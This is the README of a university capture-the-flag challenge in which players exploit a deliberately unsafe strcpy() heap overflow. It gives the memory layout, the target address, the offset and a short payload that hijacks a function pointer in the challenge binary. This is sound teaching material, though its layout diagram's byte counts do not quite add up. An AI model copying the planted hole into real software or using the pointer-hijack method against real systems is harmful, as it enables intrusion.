# Digimon Overflow - CTF Challenge for 18-739D Class @CMU

A binary exploitation challenge for 18-739D Class @CMU featuring heap overflow and function pointer hijacking with an interactive Digimon-themed interface.

## Challenge Information

- **Name:** Digimon Overflow
- **Category:** Binary Exploitation (Pwn)
- **Difficulty:** Medium
- **Points:** 400
- **Platform:** picoCTF (CMGR compatible)

## Overview

Players partner with Agumon and train it through an interactive menu system. To capture the flag, they must discover and exploit a heap buffer overflow vulnerability during the digivolution process to trigger the legendary WarGreymon and reveal the hidden flag.

### Learning Objectives
- ✅ Heap memory layout and allocation patterns
- ✅ Buffer overflow exploitation beyond the stack
- ✅ Function pointer hijacking techniques
- ✅ Distinguishing safe vs unsafe string functions
- ✅ Using GDB for dynamic binary analysis
- ✅ Calculating precise memory offsets for exploitation

## Repository Structure

```
digimon_overflow/
├── challenge.yml          # picoCTF/CMGR challenge metadata
├── metadata.yml           # CMGR build and deployment config
├── problem.md             # Player-facing challenge description
├── Dockerfile             # Container build configuration
├── Makefile              # Binary compilation rules
├── digimon.c              # Source code (provided as artifact)
├── digimon                # Compiled binary (artifact)
├── flag.txt               # Flag template (CMGR provides actual flag)
├── solver/
│   └── solve.py           # Automated solver for CMGR testing
├── agumon.txt             # ASCII art assets
├── greymon.txt
├── wargreymon.txt
└── README.md              # This file
```

## Quick Start

### For CMGR Deployment

```bash
# Build the challenge
cmgr build /path/to/digimon_overflow

# Test with automated solver
cmgr test /path/to/digimon_overflow

# Interactive playtest
cmgr playtest /path/to/digimon_overflow
```

### Manual Docker Testing

```bash
# Build with custom flag
docker build --build-arg FLAG="picoCTF{test_flag}" -t digimon-test .

# Run on port 9999
docker run -d -p 9999:9999 digimon-test

# Connect and test
nc localhost 9999
```

### Local Binary Testing

```bash
# Compile
make

# Run locally
./digimon
```

## Challenge Mechanics

### Interactive Menu System
1. **Name your Digimon** - Safe initial naming (strncpy with bounds)
2. **Train** - Gain random experience (5-15 per session)
3. **View Stats** - Display current Digimon status
4. **Challenge opponent** - (Coming soon placeholder)
5. **Exit** - Leave the Digital World
6. **Digivolve** - Unlocks at 50+ exp ⚡ **VULNERABILITY HERE**

### Exploitation Flow
1. Name your Digimon (safe operation)
2. Train 10 times to reach 50+ experience
3. Trigger digivolution (option 6 appears)
4. **During rename**: Exploit unsafe `strcpy()` to overflow heap buffer
5. Overwrite `battle_function` pointer to redirect to `wargreymon_appears()`
6. Capture the flag! 🏴

## Technical Details

### The Vulnerability

**Safe Code** (Initial naming):
```c
char safe_name[32];
fgets(safe_name, sizeof(safe_name), stdin);
strncpy(digimon->name, safe_name, sizeof(digimon->name) - 1);  // SAFE
```

**Vulnerable Code** (Digivolution rename):
```c
char input[256];
fgets(input, sizeof(input), stdin);
strcpy(digimon->name, input);  // UNSAFE - No bounds checking!
```

### Heap Memory Layout

```
┌─────────────────────────────────────────┐
│ DigimonData (malloc #1)                 │
├─────────────────────────────────────────┤
│ name[64]                   (64 bytes)   │ ← Overflow starts here
│ power_level                (4 bytes)    │
│ experience                 (4 bytes)    │
│ evolution_stage            (4 bytes)    │
│ padding                    (4 bytes)    │
├─────────────────────────────────────────┤
│ Heap Metadata              (20 bytes)   │
├─────────────────────────────────────────┤
│ BattleSystem (malloc #2)                │
├─────────────────────────────────────────┤
│ battle_function* (TARGET)  (8 bytes)    │ ← 96 bytes from name[0]
│ evolution_stage            (4 bytes)    │
│ digital_signature[16]      (16 bytes)   │
└─────────────────────────────────────────┘
```

**Exploitation offset:** 96 bytes from `name[0]` to `battle_function` pointer

### Addresses (No PIE)
- `agumon_greets()`: 0x40144b (default)
- `wargreymon_appears()`: 0x401316 (target)

## CMGR Configuration

### Dockerfile
Accepts `FLAG` as build argument (CMGR provides this):
```dockerfile
ARG FLAG=picoCTF{test_flag_please_ignore}
RUN echo "${FLAG}" > /challenge/flag.txt
```

### Automated Solver (solver/solve.py)
- Connects via `CHAL_HOST` and `CHAL_PORT` environment variables
- Performs automated exploitation
- Writes flag to `flag` file for CMGR verification

## Artifacts Provided to Players

1. **digimon** - Compiled binary (ELF 64-bit, no PIE)
2. **digimon.c** - Source code (for educational analysis)

Players can analyze the source to understand the vulnerability and craft their exploit.

## Debugging with GDB

```bash
# Launch GDB
gdb ./digimon

# Find target address
print &wargreymon_appears
# Output: 0x401316

# Set breakpoint at digivolution
break main
run
# Navigate to digivolution option

# Examine heap layout
print digimon
print battle
x/20gx digimon    # View DigimonData memory
x/20gx battle     # View BattleSystem memory

# Calculate offset
print (char*)&battle->battle_function - (char*)digimon->name
# Should be 96 bytes
```

## Solution Approach

1. **Reconnaissance**: Use `nm` or GDB to find `wargreymon_appears` address (0x401316)
2. **Offset Calculation**: Determine distance to function pointer (96 bytes)
3. **Payload Crafting**:
   ```python
   import struct
   payload = b"A" * 96 + struct.pack('<Q', 0x401316)
   ```
4. **Exploitation**: Send payload during digivolution rename
5. **Flag Capture**: WarGreymon appears with flag!

## Educational Value

This challenge demonstrates:
- **Secure vs Insecure**: `strncpy()` (safe) vs `strcpy()` (unsafe)
- **Heap Exploitation**: Beyond traditional stack-based overflows
- **Control Flow Hijacking**: Function pointer redirection
- **Null Byte Handling**: Partial pointer overwrite with `strcpy()`
- **Realistic CTF Design**: Progressive difficulty with gameplay elements

## Troubleshooting

### Docker Build Issues
```bash
# Check Dockerfile syntax
docker build --no-cache -t digimon-test .

# Verify flag file
docker run --rm digimon-test cat /challenge/flag.txt
```

### Solver Issues
```bash
# Test solver manually
cd solver
CHAL_HOST=localhost CHAL_PORT=9999 python3 solve.py

# Check logs
tail -f /var/log/cmgr/digimon_overflow.log
```

### Offset Verification
If exploitation fails, verify the offset:
```bash
gcc -o test_offset -x c - << 'EOF'
#include <stdio.h>
#include <stdlib.h>
struct DigimonData { char name[64]; int power_level; int experience; int evolution_stage; };
struct BattleSystem { void (*battle_function)(); int evolution_stage; char digital_signature[16]; };
int main() {
    struct DigimonData *d = malloc(sizeof(struct DigimonData));
    struct BattleSystem *b = malloc(sizeof(struct BattleSystem));
    printf("Offset: %ld bytes\n", (char*)&b->battle_function - (char*)d->name);
    return 0;
}
EOF
./test_offset
```

## Resources

- [CMGR Documentation](https://github.com/picoCTF/cmgr)
- [picoCTF Problem Development](https://github.com/picoCTF/start-problem-dev)
- [Heap Exploitation Basics](https://heap-exploitation.dhavalkapil.com/)
- [Pwntools Documentation](https://docs.pwntools.com/)



## Disclaimer

The Digimon name, characters,and all related materials are the property of Bandai Co., Ltd. and its respective owners
---

**⚡ Good luck, DigiDestined! The fate of the Digital World is in your hands! ⚡**
